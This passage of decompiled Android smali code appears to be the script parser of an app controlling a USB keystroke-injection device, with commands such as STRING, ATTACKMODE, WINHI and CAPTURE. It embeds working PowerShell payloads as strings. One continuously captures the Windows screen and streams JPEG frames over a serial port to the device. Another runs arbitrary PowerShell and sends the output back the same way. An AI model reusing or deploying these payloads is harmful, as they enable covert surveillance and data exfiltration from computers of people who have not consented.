    invoke-virtual {v3}, Ljava/util/HashMap;->entrySet()Ljava/util/Set;

    move-result-object v11

    invoke-interface {v11}, Ljava/util/Set;->iterator()Ljava/util/Iterator;

    move-result-object v11

    :goto_2
    invoke-interface {v11}, Ljava/util/Iterator;->hasNext()Z

    move-result v12

    if-eqz v12, :cond_3

    invoke-interface {v11}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v12

    check-cast v12, Ljava/util/Map$Entry;

    invoke-interface {v12}, Ljava/util/Map$Entry;->getKey()Ljava/lang/Object;

    move-result-object v16

    move-object/from16 v1, v16

    check-cast v1, Ljava/lang/CharSequence;

    invoke-interface {v12}, Ljava/util/Map$Entry;->getValue()Ljava/lang/Object;

    move-result-object v12

    check-cast v12, Ljava/lang/CharSequence;

    invoke-virtual {v8, v1, v12}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v8

    const/4 v1, -0x1

    goto :goto_2

    .line 2
    :cond_3
    :goto_3
    invoke-static {v8}, Landroidx/fragment/app/x0;->p(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    aget-object v11, v1, v7

    sget-object v12, Ljava/util/Locale;->ROOT:Ljava/util/Locale;

    invoke-virtual {v11, v12}, Ljava/lang/String;->toUpperCase(Ljava/util/Locale;)Ljava/lang/String;

    move-result-object v11

    array-length v7, v1

    const-string v16, ""

    const/4 v4, 0x1

    if-le v7, v4, :cond_4

    aget-object v1, v1, v4

    goto :goto_4

    :cond_4
    move-object/from16 v1, v16

    :goto_4
    invoke-virtual {v11}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    invoke-virtual {v11}, Ljava/lang/String;->hashCode()I

    move-result v5

    const/4 v7, 0x2

    sparse-switch v5, :sswitch_data_0

    :goto_5
    const/4 v5, -0x1

    goto/16 :goto_6

    :sswitch_0
    const-string v5, "DEFINE"

    invoke-virtual {v11, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_5

    goto :goto_5

    :cond_5
    const/16 v5, 0x1b

    goto/16 :goto_6

    :sswitch_1
    const-string v5, "RELEASE"

    invoke-virtual {v11, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_6

    goto :goto_5

    :cond_6
    const/16 v5, 0x1a

    goto/16 :goto_6

    :sswitch_2
    const-string v5, "DEFAULTDELAY"

    invoke-virtual {v11, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_7

    goto :goto_5

    :cond_7
    const/16 v5, 0x19

    goto/16 :goto_6

    :sswitch_3
    const-string v5, "DEFAULTCHARDELAY"

    invoke-virtual {v11, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_8

    goto :goto_5

    :cond_8
    const/16 v5, 0x18

    goto/16 :goto_6

    :sswitch_4
    const-string v5, "MOUSE_MOVE"

    invoke-virtual {v11, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_9

    goto :goto_5

    :cond_9
    const/16 v5, 0x17

    goto/16 :goto_6

    :sswitch_5
    const-string v5, "CAPTURE"

    invoke-virtual {v11, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_a

    goto :goto_5

    :cond_a
    const/16 v5, 0x16

    goto/16 :goto_6

    :sswitch_6
    const-string v5, "STARTSCREEN"

    invoke-virtual {v11, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_b

    goto :goto_5

    :cond_b
    const/16 v5, 0x15

    goto/16 :goto_6

    :sswitch_7
    const-string v5, "DEFAULT_DELAY"

    invoke-virtual {v11, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_c

    goto :goto_5

    :cond_c
    const/16 v5, 0x14

    goto/16 :goto_6

    :sswitch_8
    const-string v5, "STARTVIEW"

    invoke-virtual {v11, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_d

    goto :goto_5

    :cond_d
    const/16 v5, 0x13

    goto/16 :goto_6

    :sswitch_9
    const-string v5, "STRINGDELAY"

    invoke-virtual {v11, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_e

    goto/16 :goto_5

    :cond_e
    const/16 v5, 0x12

    goto/16 :goto_6

    :sswitch_a
    const-string v5, "WINHI"

    invoke-virtual {v11, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_f

    goto/16 :goto_5

    :cond_f
    const/16 v5, 0x11

    goto/16 :goto_6

    :sswitch_b
    const-string v5, "DELAY"

    invoke-virtual {v11, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_10

    goto/16 :goto_5

    :cond_10
    const/16 v5, 0x10

    goto/16 :goto_6

    :sswitch_c
    const-string v5, "VIEW"

    invoke-virtual {v11, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_11

    goto/16 :goto_5

    :cond_11
    const/16 v5, 0xf

    goto/16 :goto_6

    :sswitch_d
    const-string v5, "HOLD"

    invoke-virtual {v11, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_12

    goto/16 :goto_5

    :cond_12
    const/16 v5, 0xe

    goto/16 :goto_6

    :sswitch_e
    const-string v5, "REM"

    invoke-virtual {v11, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_13

    goto/16 :goto_5

    :cond_13
    const/16 v5, 0xd

    goto/16 :goto_6

    :sswitch_f
    const-string v5, "//"

    invoke-virtual {v11, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_14

    goto/16 :goto_5

    :cond_14
    const/16 v5, 0xc

    goto/16 :goto_6

    :sswitch_10
    const-string v5, "MOUSE_CLICK"

    invoke-virtual {v11, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_15

    goto/16 :goto_5

    :cond_15
    const/16 v5, 0xb

    goto/16 :goto_6

    :sswitch_11
    const-string v5, "STRING_DELAY"

    invoke-virtual {v11, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_16

    goto/16 :goto_5

    :cond_16
    const/16 v5, 0xa

    goto/16 :goto_6

    :sswitch_12
    const-string v5, "END_REPEAT"

    invoke-virtual {v11, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_17

    goto/16 :goto_5

    :cond_17
    const/16 v5, 0x9

    goto/16 :goto_6

    :sswitch_13
    const-string v5, "ATTACKMODE"

    invoke-virtual {v11, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_18

    goto/16 :goto_5

    :cond_18
    const/16 v5, 0x8

    goto/16 :goto_6

    :sswitch_14
    const-string v5, "GETWINHI"

    invoke-virtual {v11, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_19

    goto/16 :goto_5

    :cond_19
    const/4 v5, 0x7

    goto :goto_6

    :sswitch_15
    const-string v5, "MOUSE_SCROLL"

    invoke-virtual {v11, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_1a

    goto/16 :goto_5

    :cond_1a
    const/4 v5, 0x6

    goto :goto_6

    :sswitch_16
    const-string v5, "DEFAULT_CHAR_DELAY"

    invoke-virtual {v11, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_1b

    goto/16 :goto_5

    :cond_1b
    const/4 v5, 0x5

    goto :goto_6

    :sswitch_17
    const-string v5, "STRINGLN"

    invoke-virtual {v11, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_1c

    goto/16 :goto_5

    :cond_1c
    const/4 v5, 0x4

    goto :goto_6

    :sswitch_18
    const-string v5, "STRING"

    invoke-virtual {v11, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_1d

    goto/16 :goto_5

    :cond_1d
    const/4 v5, 0x3

    goto :goto_6

    :sswitch_19
    const-string v5, "SCREEN"

    invoke-virtual {v11, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_1e

    goto/16 :goto_5

    :cond_1e
    move v5, v7

    goto :goto_6

    :sswitch_1a
    const-string v5, "REPEAT"

    invoke-virtual {v11, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_1f

    goto/16 :goto_5

    :cond_1f
    const/4 v5, 0x1

    goto :goto_6

    :sswitch_1b
    const-string v5, "RELEASE_ALL"

    invoke-virtual {v11, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_20

    goto/16 :goto_5

    :cond_20
    const/4 v5, 0x0

    :goto_6
    const-string v11, "\\s+"

    const-wide/16 v19, 0x1388

    packed-switch v5, :pswitch_data_0

    invoke-static {v13, v8}, Landroidx/fragment/app/x0;->l(ILjava/lang/String;)Lg3/g;

    move-result-object v6

    invoke-virtual {v2, v6}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    const-wide/16 v4, 0x0

    cmp-long v1, v9, v4

    if-lez v1, :cond_21

    .line 3
    new-instance v1, Lg3/i;

    invoke-direct {v1, v13, v9, v10}, Lg3/i;-><init>(IJ)V

    invoke-virtual {v2, v1}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    :cond_21
    :goto_7
    move v8, v13

    :goto_8
    const/4 v1, -0x1

    const/4 v7, 0x0

    goto/16 :goto_0

    .line 4
    :pswitch_0
    invoke-static {v1}, Landroidx/fragment/app/x0;->p(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    array-length v4, v1

    if-lt v4, v7, :cond_22

    const/4 v4, 0x0

    aget-object v5, v1, v4

    const/4 v4, 0x1

    aget-object v1, v1, v4

    invoke-virtual {v3, v5, v1}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    :pswitch_1
    move-object/from16 v23, v0

    move-object/from16 v22, v3

    move v8, v13

    move-wide/from16 v24, v14

    :goto_9
    const/4 v4, 0x0

    goto/16 :goto_1

    :cond_22
    new-instance v0, Lg3/a;

    const-string v1, "DEFINE expects NAME VALUE"

    invoke-direct {v0, v13, v1}, Lg3/a;-><init>(ILjava/lang/String;)V

    throw v0

    .line 5
    :pswitch_2
    invoke-virtual {v1}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1, v11}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    array-length v4, v1

    if-lt v4, v7, :cond_23

    const/4 v4, 0x0

    aget-object v5, v1, v4

    invoke-static {v13, v5}, Landroidx/fragment/app/x0;->m(ILjava/lang/String;)I

    move-result v5

    const/4 v6, 0x1

    aget-object v1, v1, v6

    invoke-static {v13, v1}, Landroidx/fragment/app/x0;->m(ILjava/lang/String;)I

    move-result v1

    filled-new-array {v5, v1}, [I

    move-result-object v1

    .line 6
    new-instance v5, Lg3/l;

    aget v7, v1, v4

    aget v1, v1, v6

    invoke-direct {v5, v13, v7, v1}, Lg3/l;-><init>(III)V

    invoke-virtual {v2, v5}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    move-object v6, v5

    goto :goto_7

    .line 7
    :cond_23
    new-instance v0, Lg3/a;

    const-string v1, "Expected two integers"

    invoke-direct {v0, v13, v1}, Lg3/a;-><init>(ILjava/lang/String;)V

    throw v0

    .line 8
    :pswitch_3
    invoke-static {v13, v1}, Landroidx/fragment/app/x0;->n(ILjava/lang/String;)J

    move-result-wide v9

    goto :goto_7

    :pswitch_4
    const-wide/16 v5, 0x5

    invoke-static {v14, v15, v5, v6}, Ljava/lang/Math;->max(JJ)J

    move-result-wide v5

    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z

    move-result v8

    const-wide/16 v22, 0x64

    const-wide/16 v24, 0x500

    const-wide/16 v26, 0x2d0

    const-wide/16 v28, 0x37

    if-nez v8, :cond_2f

    invoke-virtual {v1}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1, v11}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    array-length v8, v1

    const/4 v11, 0x1

    if-lt v8, v11, :cond_24

    const/4 v8, 0x0

    aget-object v11, v1, v8

    invoke-static {v11}, Landroidx/fragment/app/x0;->j(Ljava/lang/String;)Z

    move-result v11

    if-eqz v11, :cond_24

    aget-object v5, v1, v8

    invoke-static {v13, v5}, Landroidx/fragment/app/x0;->n(ILjava/lang/String;)J

    move-result-wide v5

    :cond_24
    array-length v8, v1

    const-wide/16 v11, 0x1

    if-lt v8, v7, :cond_26

    const/4 v8, 0x1

    aget-object v16, v1, v8

    invoke-static/range {v16 .. v16}, Landroidx/fragment/app/x0;->j(Ljava/lang/String;)Z

    move-result v16

    if-eqz v16, :cond_26

    aget-object v8, v1, v8

    invoke-static {v13, v8}, Landroidx/fragment/app/x0;->n(ILjava/lang/String;)J

    move-result-wide v22

    cmp-long v8, v22, v11

    if-gez v8, :cond_25

    move-wide/from16 v22, v11

    :cond_25
    cmp-long v8, v22, v19

    if-lez v8, :cond_26

    goto :goto_a

    :cond_26
    move-wide/from16 v19, v22

    :goto_a
    array-length v8, v1

    const/4 v4, 0x3

    if-lt v8, v4, :cond_29

    aget-object v4, v1, v7

    invoke-static {v4}, Landroidx/fragment/app/x0;->j(Ljava/lang/String;)Z

    move-result v4

    if-eqz v4, :cond_29

    aget-object v4, v1, v7

    invoke-static {v13, v4}, Landroidx/fragment/app/x0;->n(ILjava/lang/String;)J

    move-result-wide v7

    const-wide/16 v22, 0x140

    cmp-long v4, v7, v22

    if-gez v4, :cond_27

    move-wide/from16 v7, v22

    :cond_27
    const-wide/16 v22, 0xf00

    cmp-long v4, v7, v22

    if-lez v4, :cond_28

    move-wide/from16 v24, v22

    goto :goto_b

    :cond_28
    move-wide/from16 v24, v7

    :goto_b
    and-long v7, v24, v11

    cmp-long v4, v7, v11

    if-nez v4, :cond_29

    sub-long v24, v24, v11

    :cond_29
    array-length v4, v1

    const/4 v7, 0x4

    if-lt v4, v7, :cond_2c

    const/4 v4, 0x3

    aget-object v7, v1, v4

    invoke-static {v7}, Landroidx/fragment/app/x0;->j(Ljava/lang/String;)Z

    move-result v7

    if-eqz v7, :cond_2c

    aget-object v4, v1, v4

    invoke-static {v13, v4}, Landroidx/fragment/app/x0;->n(ILjava/lang/String;)J

    move-result-wide v7

    const-wide/16 v16, 0xb4

    cmp-long v4, v7, v16

    if-gez v4, :cond_2a

    move-wide/from16 v7, v16

    :cond_2a
    const-wide/16 v16, 0x870

    cmp-long v4, v7, v16

    if-lez v4, :cond_2b

    move-wide/from16 v26, v16

    goto :goto_c

    :cond_2b
    move-wide/from16 v26, v7

    :goto_c
    and-long v7, v26, v11

    cmp-long v4, v7, v11

    if-nez v4, :cond_2c

    sub-long v26, v26, v11

    :cond_2c
    array-length v4, v1

    const/4 v7, 0x5

    if-lt v4, v7, :cond_2e

    const/4 v4, 0x4

    aget-object v7, v1, v4

    invoke-static {v7}, Landroidx/fragment/app/x0;->j(Ljava/lang/String;)Z

    move-result v7

    if-eqz v7, :cond_2e

    aget-object v1, v1, v4

    invoke-static {v13, v1}, Landroidx/fragment/app/x0;->n(ILjava/lang/String;)J

    move-result-wide v7

    const-wide/16 v11, 0xa

    cmp-long v1, v7, v11

    if-gez v1, :cond_2d

    move-wide/from16 v28, v11

    goto :goto_d

    :cond_2d
    move-wide/from16 v28, v7

    :goto_d
    const-wide/16 v7, 0x5f

    cmp-long v1, v28, v7

    if-lez v1, :cond_2e

    move-object/from16 v22, v3

    move-wide/from16 v11, v26

    move-wide/from16 v30, v7

    move-object v8, v0

    move-wide/from16 v0, v30

    move-wide/from16 v32, v5

    move-wide/from16 v6, v24

    move-wide/from16 v4, v19

    move-wide/from16 v20, v32

    goto :goto_e

    :cond_2e
    move-object v8, v0

    move-object/from16 v22, v3

    move-wide/from16 v11, v26

    move-wide/from16 v0, v28

    move-wide/from16 v30, v5

    move-wide/from16 v6, v24

    move-wide/from16 v4, v19

    move-wide/from16 v20, v30

    goto :goto_e

    :cond_2f
    move-object v8, v0

    move-wide/from16 v20, v5

    move-wide/from16 v4, v22

    move-wide/from16 v6, v24

    move-wide/from16 v11, v26

    move-wide/from16 v0, v28

    move-object/from16 v22, v3

    :goto_e
    new-instance v3, Ljava/lang/StringBuilder;

    move-object/from16 v23, v8

    const-string v8, "$W="

    invoke-direct {v3, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v6, v7}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const-string v6, "$W=1280;$H=720;$Q=55;$I=100; $src=\'using System.Drawing;using System.Drawing.Drawing2D;using System.Drawing.Imaging;using System.IO;using System.Runtime.InteropServices;using System.Windows.Forms;public static class H{[DllImport(\"user32.dll\")] static extern bool SetProcessDPIAware();static H(){try{SetProcessDPIAware();}catch{}}static ImageCodecInfo c=System.Array.Find(ImageCodecInfo.GetImageEncoders(),x=>x.MimeType==\"image/jpeg\");public static byte[] F(int w,int h,int q){var b=Screen.PrimaryScreen.Bounds;using(var s=new Bitmap(b.Width,b.Height))using(var g=Graphics.FromImage(s)){g.CopyFromScreen(b.X,b.Y,0,0,b.Size);using(var d=new Bitmap(w,h,PixelFormat.Format24bppRgb))using(var g2=Graphics.FromImage(d))using(var a=new ImageAttributes()){a.SetWrapMode(WrapMode.TileFlipXY);g2.InterpolationMode=InterpolationMode.HighQualityBilinear;g2.PixelOffsetMode=PixelOffsetMode.HighQuality;g2.DrawImage(s,new Rectangle(0,0,w,h),0,0,b.Width,b.Height,GraphicsUnit.Pixel,a);using(var m=new MemoryStream()){var p=new EncoderParameters(1);p.Param[0]=new EncoderParameter(Encoder.Quality,(long)q);d.Save(m,c,p);return m.ToArray();}}}}}\'; if(-not(\'H\' -as [type])){Add-Type -TypeDefinition $src -ReferencedAssemblies System.Drawing,System.Windows.Forms}; $null=[H]::F(2,2,50); $id=@(gwmi Win32_PnPEntity|?{$_.DeviceID -match \'VID_1D50.PID_601[89]|VID_0525.PID_A4A7\' -or $_.Caption -match \'Stryker\'}|%{[regex]::Match($_.Caption,\'COM\\d+\').Value}|?{$_})[0]; if(-not $id){return}; $p=[System.IO.Ports.SerialPort]::new($id,115200,\'None\',8,\'One\'); $p.WriteTimeout=30000; $p.WriteBufferSize=1048576; $p.Open(); trap{if($p -and $p.IsOpen){try{$p.Close()}catch{};try{$p.Dispose()}catch{}};break}; $m=[byte[]]@(0x53,0x54,0x52,0x4B); $hw=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width; $hh=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height; $hwBE=[byte[]]@([byte](($hw -shr 8) -band 0xFF),[byte]($hw -band 0xFF)); $hhBE=[byte[]]@([byte](($hh -shr 8) -band 0xFF),[byte]($hh -band 0xFF)); while($true){$f=[H]::F($W,$H,$Q); $l=[BitConverter]::GetBytes([uint32]$f.Length); if([BitConverter]::IsLittleEndian){[Array]::Reverse($l)}; $t=[BitConverter]::GetBytes([int64]([DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds())); if([BitConverter]::IsLittleEndian){[Array]::Reverse($t)}; try{$p.Write($m,0,4);$p.Write($l,0,4);$p.Write($t,0,8);$p.Write($hwBE,0,2);$p.Write($hhBE,0,2);$p.Write($f,0,$f.Length)}catch{try{$p.DiscardOutBuffer()}catch{}}; Start-Sleep -Milliseconds $I}"

    const-string v7, "$W=1280"

    invoke-virtual {v6, v7, v3}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    new-instance v6, Ljava/lang/StringBuilder;

    const-string v7, "$H="

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6, v11, v12}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    const-string v7, "$H=720"

    invoke-virtual {v3, v7, v6}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    new-instance v6, Ljava/lang/StringBuilder;

    const-string v7, "$Q="

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6, v0, v1}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "$Q=55"

    invoke-virtual {v3, v1, v0}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v3, "$I="

    invoke-direct {v1, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v4, v5}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    const-string v3, "$I=100"

    invoke-virtual {v0, v3, v1}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v18

    new-instance v6, Lg3/p;

    const/16 v19, 0x1

    move-object/from16 v16, v6

    move/from16 v17, v13

    invoke-direct/range {v16 .. v21}, Lg3/p;-><init>(ILjava/lang/String;ZJ)V

    invoke-virtual {v2, v6}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    move v8, v13

    move-object/from16 v3, v22

    :goto_f
    move-object/from16 v0, v23

    goto/16 :goto_8

    :pswitch_5
    move-object/from16 v23, v0

    move-object/from16 v22, v3

    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_32

    invoke-static {v1}, Landroidx/fragment/app/x0;->p(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    array-length v3, v0

    const/4 v4, 0x1

    if-le v3, v4, :cond_30

    const/4 v3, 0x0

    aget-object v5, v0, v3

    invoke-static {v5}, Landroidx/fragment/app/x0;->j(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_30

    aget-object v1, v0, v3

    invoke-static {v13, v1}, Landroidx/fragment/app/x0;->n(ILjava/lang/String;)J

    move-result-wide v19

    aget-object v1, v0, v4

    :cond_30
    move-wide/from16 v3, v19

    invoke-virtual {v1}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_31

    const-string v0, "$id=@(gwmi Win32_PnPEntity|?{$_.DeviceID -match \'VID_1D50.PID_601[89]\'}|%{[regex]::Match($_.Caption,\'COM\\d+\').Value}|?{$_})[0]; if($id){$p=[System.IO.Ports.SerialPort]::new($id,9600);$p.Open();try{$o=&{"

    const-string v5, "}|Out-String;$o=$o -replace \"`r`n\",\" | \" -replace \"`n\",\" | \";$p.WriteLine($o.Trim())}catch{$p.WriteLine(\"ERR: $_\")};$p.Close()}"

    .line 9
    invoke-static {v0, v1, v5}, Lorg/bouncycastle/math/ec/a;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 10
    new-instance v1, Lg3/p;

    const/4 v5, 0x1

    move-object v11, v1

    move v12, v13

    move v8, v13

    move-object v13, v0

    move-wide/from16 v24, v14

    move v14, v5

    move-wide/from16 v15, v24

    invoke-direct/range {v11 .. v16}, Lg3/p;-><init>(ILjava/lang/String;ZJ)V

    invoke-virtual {v2, v1}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    new-instance v6, Lg3/f;

    invoke-direct {v6, v8, v3, v4}, Lg3/f;-><init>(IJ)V

    :goto_10
    invoke-virtual {v2, v6}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    move-object/from16 v3, v22

    move-object/from16 v0, v23

    move-wide/from16 v14, v24

    goto/16 :goto_8

    :cond_31
    move v8, v13

    new-instance v0, Lg3/a;

    const-string v1, "WINHI needs a command after the timeout"

    invoke-direct {v0, v8, v1}, Lg3/a;-><init>(ILjava/lang/String;)V

    throw v0

    :cond_32
    move v8, v13

    new-instance v0, Lg3/a;

    const-string v1, "WINHI needs a PowerShell command"

    invoke-direct {v0, v8, v1}, Lg3/a;-><init>(ILjava/lang/String;)V

    throw v0

    :pswitch_6
    move-object/from16 v23, v0

    move-object/from16 v22, v3

    move v8, v13

    move-wide/from16 v24, v14

    new-instance v6, Lg3/i;

    invoke-static {v8, v1}, Landroidx/fragment/app/x0;->n(ILjava/lang/String;)J

    move-result-wide v0

    invoke-direct {v6, v8, v0, v1}, Lg3/i;-><init>(IJ)V

    invoke-virtual {v2, v6}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    goto/16 :goto_f

    :pswitch_7
    move-object/from16 v23, v0

    move-object/from16 v22, v3

    move v8, v13

    move-wide/from16 v24, v14

    .line 11
    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_33

    new-instance v6, Lg3/j;

    invoke-static {v8, v1}, Landroidx/fragment/app/x0;->l(ILjava/lang/String;)Lg3/g;

    move-result-object v0

    invoke-static {v8, v1}, Landroidx/fragment/app/x0;->l(ILjava/lang/String;)Lg3/g;

    move-result-object v1

    iget v1, v1, Lg3/g;->c:I

    iget v0, v0, Lg3/g;->b:I

    invoke-direct {v6, v8, v0, v1}, Lg3/j;-><init>(III)V

    goto :goto_10

    :cond_33
    new-instance v0, Lg3/a;

    const-string v1, "HOLD requires keys"

    invoke-direct {v0, v8, v1}, Lg3/a;-><init>(ILjava/lang/String;)V

    throw v0

    :pswitch_8
    move-object/from16 v23, v0

    move-object/from16 v22, v3

    move v8, v13

    move-wide/from16 v24, v14

    .line 12
    new-instance v0, Lg3/h;

    .line 13
    invoke-direct {v0, v8}, Lg3/q;-><init>(I)V

    .line 14
    invoke-virtual {v2, v0}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    goto/16 :goto_9

    :pswitch_9
    move-object/from16 v23, v0

    move-object/from16 v22, v3

    move v8, v13

    move-wide/from16 v24, v14

    const/4 v4, 0x4

    .line 15
    invoke-virtual {v1}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0, v12}, Ljava/lang/String;->toUpperCase(Ljava/util/Locale;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    const/4 v3, -0x1

    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v5

    sparse-switch v5, :sswitch_data_1

    goto :goto_11

    :sswitch_1c
    const-string v5, "RIGHT"

    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_34

    goto :goto_11

    :cond_34
    const/4 v3, 0x3

    goto :goto_11

    :sswitch_1d
    const-string v5, "LEFT"

    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_35

    goto :goto_11

    :cond_35
    const/4 v3, 0x2

    goto :goto_11

    :sswitch_1e
    const-string v5, ""

    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_36

    goto :goto_11

    :cond_36
    const/4 v3, 0x1

    goto :goto_11

    :sswitch_1f
    const-string v5, "MIDDLE"

    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_37

    goto :goto_11

    :cond_37
    const/4 v3, 0x0

    :goto_11
    packed-switch v3, :pswitch_data_1

    new-instance v0, Lg3/a;

    const-string v2, "Unknown mouse button \'"

    const-string v3, "\'"

    .line 16
    invoke-static {v2, v1, v3}, Lorg/bouncycastle/math/ec/a;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 17
    invoke-direct {v0, v8, v1}, Lg3/a;-><init>(ILjava/lang/String;)V

    throw v0

    :pswitch_a
    move v4, v7

    goto :goto_12

    :pswitch_b
    const/4 v4, 0x1

    .line 18
    :goto_12
    :pswitch_c
    new-instance v6, Lg3/k;

    invoke-direct {v6, v8, v4}, Lg3/k;-><init>(II)V

    goto/16 :goto_10

    :pswitch_d
    move-object/from16 v23, v0

    move-object/from16 v22, v3

    move v8, v13

    move-wide/from16 v24, v14

    invoke-static {v1}, Landroidx/fragment/app/x0;->p(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    array-length v1, v0

